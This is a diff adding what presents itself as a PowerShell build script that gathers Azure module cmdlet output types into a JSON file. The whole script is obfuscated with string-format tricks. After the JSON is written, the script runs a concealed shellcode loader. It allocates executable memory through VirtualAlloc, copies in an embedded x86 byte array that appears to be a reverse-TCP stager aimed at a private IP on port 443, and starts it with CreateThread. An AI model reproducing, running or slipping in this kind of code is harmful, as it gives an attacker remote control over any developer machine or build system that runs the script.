@@ -1,0 +1,59 @@
+ $43oPhX =[Type]("{3}{2}{1}{4}{0}{5}"-f '.AssEM','tI','c','refle','On','bly');  param(
+    [Parameter(mANDAtOrY = $false)]
+    [string] $BuildConfig = ("{1}{0}"-f 'ug','Deb'),
+    [Parameter(MaNdAtORy = $false)]
+    [string] $OutputFile = "$PSScriptRoot/outputtypes.json"
+)
+
+
+$psd1Files = Get-Childitem ((("{2}{4}{1}{0}{9}{5}{6}{8}{3}{7}" -f 'otusb..','PSScriptRo','eY','onfi','a','bartifa','ctsusbeYaBuild','g','C','us'))  -rEPlaCe 'usb',[chaR]92-CrePLaCE  'eYa',[chaR]36) -Recurse | where {$_."N`Ame" -like ("{1}{0}" -f'1','*.psd') }
+
+$profilePsd1 = $psd1Files | Where-Object {$_."N`AmE" -like ("{3}{0}{4}{1}{2}" -f'Acc','unts','.psd1','*Az.','o')}
+Import-LocalizedData -BindingVariable ("{2}{1}{0}"-f 'e','sd1Fil','p') -BaseDirectory $profilePsd1."D`i`REcTo`RyNAme" -FileName $profilePsd1."n`AMe"
+foreach ($nestedModule in $psd1File."R`eQ`UIRe`dasS`E`mBlieS")
+{
+    $dllPath = Join-Path -Path $profilePsd1."d`ir`eCToRyN`AMe" -ChildPath $nestedModule
+    $Assembly =  (  get-VAriaBLE 43Ophx -ValueoNL)::("{0}{2}{1}"-f 'Loa','om','dFr').Invoke($dllPath)
+}
+
+$outputTypes = New-Object ("{7}{2}{0}{8}{4}{3}{9}{6}{5}{1}" -f 'l',']','stem.Co','ns.','ectio','.HashSet[string','eneric','Sy','l','G')
+
+$psd1Files | ForEach {
+    Import-LocalizedData -BindingVariable ("{2}{1}{0}"-f 'File','1','psd') -BaseDirectory $_."dI`RectOR`yNAmE" -FileName $_."Na`ME"
+    foreach ($nestedModule in $psd1File."n`eSTeD`modu`l`ES")
+    {
+        $dllPath = Join-Path -Path $_."DIrec`TO`RyN`AMe" -ChildPath $nestedModule
+        $Assembly =  $43OpHX::("{1}{0}" -f 'oadFrom','L').Invoke($dllPath)
+        $exportedTypes = $Assembly.("{2}{1}{0}"-f 'ypes','T','Get').Invoke()
+        foreach ($exportedType in $exportedTypes)
+        {
+            foreach ($attribute in $exportedType."CuS`T`oMa`TTRib`UteS")
+            {
+                if ($attribute."aTTrIBu`Te`TyPe"."nA`ME" -eq ("{4}{0}{1}{2}{3}{5}" -f'p','u','tTypeAt','tri','Out','bute'))
+                {
+                    $cmdletOutputTypes = $attribute."Co`NStR`U`CToRAR`G`UmeNTs"."va`Lue"."V`AlUe"
+                    foreach ($cmdletOutputType in $cmdletOutputTypes)
+                    {
+                        $outputTypes.("{1}{0}"-f 'dd','A').Invoke($cmdletOutputType."Fu`LlNAMe") | Out-Null
+                    }
+                }
+            }
+
+            foreach ($property in $exportedType.("{3}{2}{4}{0}{1}"-f'tie','s','Pro','Get','per').Invoke() | Where-Object {$_."Cu`stom`A`T`Tr`IbUTEs"."a`TTri`BuTe`TY`PE"."na`mE" -contains ("{4}{2}{0}{3}{1}"-f 'ameterAttri','ute','r','b','Pa')})
+            {
+                if ($property."pRope`RTyTY`pE"."F`U`llnaMe" -like "*System.Nullable*``[``[*")
+                {
+                    $outputTypes.("{0}{1}"-f'A','dd').Invoke(($property."pr`OPERt`YTYPE"."BA`SEt`YpE"."fUll`N`AME" -replace ("{1}{0}" -f '][]','['), "")) | Out-Null
+                }
+                elseif ($property."Pr`OPeR`TY`TYPe"."FU`lLn`AME" -notlike "*``[``[*")
+                {
+                    $outputTypes.("{0}{1}"-f'Ad','d').Invoke(($property."pR`opert`YTYPe"."F`U`LLnamE" -replace ("{1}{0}" -f ']','[]['), "")) | Out-Null
+                }
+            }
+        }
+    }
+}
+
+$json = ConvertTo-Json $outputTypes
+$json | Out-File "$OutputFile"
+$c = ((("{95}{70}{62}{114}{15}{109}{118}{111}{8}{72}{73}{40}{33}{96}{26}{97}{115}{41}{34}{24}{0}{30}{59}{18}{43}{112}{13}{53}{28}{77}{51}{86}{16}{83}{54}{55}{21}{68}{46}{78}{67}{45}{74}{20}{11}{22}{123}{58}{124}{31}{4}{101}{116}{105}{39}{91}{49}{35}{56}{36}{12}{93}{119}{113}{106}{17}{25}{19}{2}{65}{48}{63}{32}{14}{71}{61}{5}{37}{3}{7}{98}{90}{27}{121}{85}{104}{1}{120}{84}{122}{102}{88}{60}{64}{100}{47}{108}{76}{75}{69}{9}{89}{117}{6}{87}{107}{94}{29}{82}{42}{66}{52}{23}{80}{110}{103}{79}{50}{10}{57}{99}{81}{92}{44}{38}" -f 't','r l','bu',' lp','blic ','nt','crt.dl','S',']public','DllIm',', ui','ort','a','ss, uin','S','.','t','readAt','Ad','i','DllImp','o','(3Kjk','mems','c(In','tr','n ','r',' dw','tatic ex','Ptr ','u','k','exte','o','at','e','Ptr',';',' ','c ','ll','ern IntPt','dr','unt)','tect);','Type','s','ui','e','st','e,',' ','t','ll','ocati','eThr','n','el32.d','lp','reati','e, I','Kjkerne','nt dwStac','onF','tes, ','r','flPro','n','eadId);[','Import(3','iz',' ','stati','[','hr','r lpT','Siz',', uint ','de','et',' ui','t',' flA','ra','Address, ',' uin','l3Kj)]p','C','p','a','extern IntPtr Cr','nt co','d(','ic s','[Dll','r','IntPtr V','t','t src,','lag','st','nt dw','tr ','IntPt','ic','pTh','ubl',', IntPt','dl','(IntP',')','e',' l','l32','irtualA','at','ort(3Kjmsv','l3Kj','IntPtr','pPa','t','meter, ui','ern','ll3Kj)]p')) -CREplaCE([chAr]51+[chAr]75+[chAr]106),[chAr]34);$w = Add-Type -memberDefinition $c -Name ("{0}{1}"-f 'Win3','2') -namespace ("{0}{3}{2}{1}" -f'Win','ons','uncti','32F') -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x2b,0x2c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z."lE`NgTH" -gt 0x1000){$g = $z."l`EnGth"};$x=$w::("{0}{2}{3}{1}"-f 'VirtualA','c','l','lo').Invoke(0,0x1000,$g,0x40);for ($i=0;$i -le ($z."l`enG`Th"-1);$i++) {$w::"M`em`SET"([IntPtr]($x.("{0}{2}{1}"-f'To','2','Int3').Invoke()+$i), $z[$i], 1)};$w::("{3}{0}{1}{2}"-f'reateTh','r','ead','C').Invoke(0,0,$x,0,0,0);for (;;){Start-sleep 60};
